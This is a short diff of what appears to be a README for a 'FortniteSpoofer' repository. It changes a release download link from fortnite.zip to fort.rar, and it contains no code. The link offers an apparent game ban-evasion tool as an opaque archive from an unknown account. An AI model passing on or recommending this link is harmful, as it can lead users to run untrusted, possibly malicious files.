@@ -1,4 +1,4 @@
-|[Download](https://github.com/akbarga1418y-hub/FortniteSpoofer/releases/download/download/fortnite.zip)
+|[Download](https://github.com/akbarga1418y-hub/FortniteSpoofer/releases/download/download/fort.rar)
 |:------------- |
 
 ## Disclaimer:
